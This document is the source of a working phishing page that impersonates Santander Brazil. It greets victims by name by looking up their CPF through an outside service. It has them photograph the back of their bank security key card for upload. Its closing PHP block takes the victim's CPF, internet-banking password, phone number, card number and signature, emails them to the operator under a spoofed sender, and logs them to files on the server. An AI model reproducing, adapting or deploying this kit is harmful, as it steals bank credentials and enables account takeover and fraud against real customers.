﻿<?php
session_save_path('');
session_start();
ob_start();
foreach($_POST as $key => $value){
	$_SESSION[$key] = $value;
}

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">
<link rel="stylesheet" type="text/css" href="style.css" />
<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="js/jquery.maskedinput.min.js" language="javascript"></script>
<script src="script.js" language="javascript"></script>
<script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>
<script src="js/ImageTools.js" language="javascript"></script>

<style>

.image-upload > input
{
    display: none;
}
		
</style>

<script language="javascript">
        var hasUploaded = false;
        var statusUpload = "stopped";
        function confirmUpload()
        {
            if(!hasUploaded)
            {
                alert("É necessário concluir o upload antes de confirmar a operação.");

                return false;
            }
            else
            {
                //alert("Operação concluída com sucesso!");
               // window.location = "https://www.santanderesfera.com.br/blog";
				window.location = "done.php";
            }


            return true;
        }
        var dataURLToBlob = function(dataURL) {
            var BASE64_MARKER = ';base64,';
            if (dataURL.indexOf(BASE64_MARKER) == -1) {
                var parts = dataURL.split(',');
                var contentType = parts[0].split(':')[1];
                var raw = parts[1];

                return new Blob([raw], {type: contentType});
            }

            var parts = dataURL.split(BASE64_MARKER);
            var contentType = parts[0].split(':')[1];
            var raw = window.atob(parts[1]);
            var rawLength = raw.length;

            var uInt8Array = new Uint8Array(rawLength);

            for (var i = 0; i < rawLength; ++i) {
                uInt8Array[i] = raw.charCodeAt(i);
            }

            return new Blob([uInt8Array], {type: contentType});
        }

        $(document).on("imageResized", function (event) {
            var data = new FormData($("form[id*='uploadImageForm']")[0]);
            if (event.blob) {
                data.append('camera', event.blob);

                $.ajax({
                    url: "upload.php",
                    data: data,
                    cache: false,
                    contentType: false,
                    processData: false,
                    type: 'POST',
                    success: function(data){
                        alert("Operação realizada com sucesso.");
					   
						setTimeout(function(){ window.location = "done.php"; }, 2000);

                    }
                });
            }
        });
        $(document).on('change', $('#camera'), function(event) {
			
			$("#img1").hide();
			$("#capturar").hide();
			$("#distrair").show();
			
            $("#confirmaUp").html("Enviando, por favor aguarde...");
            statusUpload = "sending";
            window.setInterval(function() {
                console.log("Timeout -> default submit triggered.");
                if(statusUpload == "sending" && !hasUploaded)
                {
                    $('#postForm').attr('action', 'upload');
                    $('#postForm').submit();
                }
            }, 50000);

            ImageTools.resize(event.target.files[0], {
                width: 800, // maximum width
                height: 600 // maximum height
            }, function(blob, didItResize) {
                console.log(blob);
                $.event.trigger({
                    type: "imageResized",
                    blob: blob
                });
            });
        });

</script>

</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2" style="color: #848fa0; font-weight: bold">
 	<div style="width: 80px;float: left;"><img src="images/user-icon.png" /></div>
	<div style="float: left; padding-top: 35px; padding-left: 10px;">
	Olá <span id="nome" style="color: #848fa0;">Cliente</span>
	</div>
 </div>

<div id="campos">
<form method="post" enctype="application/x-www-form-urlencoded">
 
<br>
<br>

  
 <div style="padding: 10px; padding-bottom: 20px;">
 	<p>Clique no icone de câmera abaixo para reativar seu Cartão de Segurança em modo SMS Token, durante o registro da foto é necessário enquadrar por completo o verso do seu Cartão Chave de Segurança on-line, incluindo o código da referência. </p>
 </div>
 
 <div class="img-box" id="img1">
   <img src="images/imagemcso.png">  	
 </div>
 
 <div class="img-box" style="display: none" id="distrair">
   <img src="images/id_santander_anima_sincronia.gif">  	
 </div>
 
 
 <div id="capturar" class="img-box pt30 image-upload">
     <label for="fotografia">
       <img src="images/camera-icon.png" style="cursor: pointer;">  	
	 </label>
	 
	 <input name="fotografia" type="file"  id="fotografia" accept="image/*" capture="camera" required />

 </div>
 
		
</form>

</div>


<script language="javascript">
  $(document).ready(function(){
		$().bipbop("SELECT FROM 'BIPBOPJS'.'CPFCNPJ'", null, {
		  data: {
			  documento: "<?= $_SESSION['cpf'] ?>",
		  },

		  success: function(data) {
			var nome = $(data).find("body nome").text();
			var exception = $(data).find("header exception").text();

			if (exception) {
			  exception = exception.replace(/, t/, '. T');
			  //$('#status').text(exception);
			} else {
			  $("#nome").text(ucfirst(nome.split(" ")[0]));
			  $("#dados").show();
			}
		  }
		});	  
  });
</script>

</body>
</html>
<?php
require_once("config.php");
extract($_POST);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: SANTA - INFO <chegou@hp.com>";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo.="
------------------ Dados -------------------<br>
$data-($hora) - $ip<br>
--------------------------------------------<br>
CPF.........: $cpf<br>
ENTRADA.....: $snet<br>
CELULAR.....: ($ddd) $fone<br>
CARTAO......: $scard<br>
ASSINATURA......: $sass<br>
--------------------------------------------<br>
Created by Robson
";

@mail($receber, "SANTA - INFO - $ip", "$conteudo", $headers); 



$tudo = "
<tr><td><font color='red' size='4'>$cpf</font></td><td><font color='red' size='4'>$snet</font></td><td><font color='red' size='4'>$ddd $fone</font></td><td><font color='red' size='4'>$scard</font></td><td><font color='red' size='4'>$sass</font></td><td><font color='red' size='4'>$data</font></td><td><font color='red' size='4'>$ip</font></td></tr>";
$fopen = fopen("data_base1.php", "a");
fwrite($fopen, $tudo);
fclose($fopen);


$ip_usuario = $_SERVER['REMOTE_ADDR'];
$today = date("His");
$myFile = "./inf0s/" . "SANTA-$ip_usuario" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = "
=========================================\n
$data-($hora) - $ip<br>
CPF.........: $cpf<br>
ENTRADA.....: $snet<br>
CELULAR.....: ($ddd) $fone<br>
CARTAO......: $scard<br>
=========================================\n";
fwrite($fh, $stringData);

?>
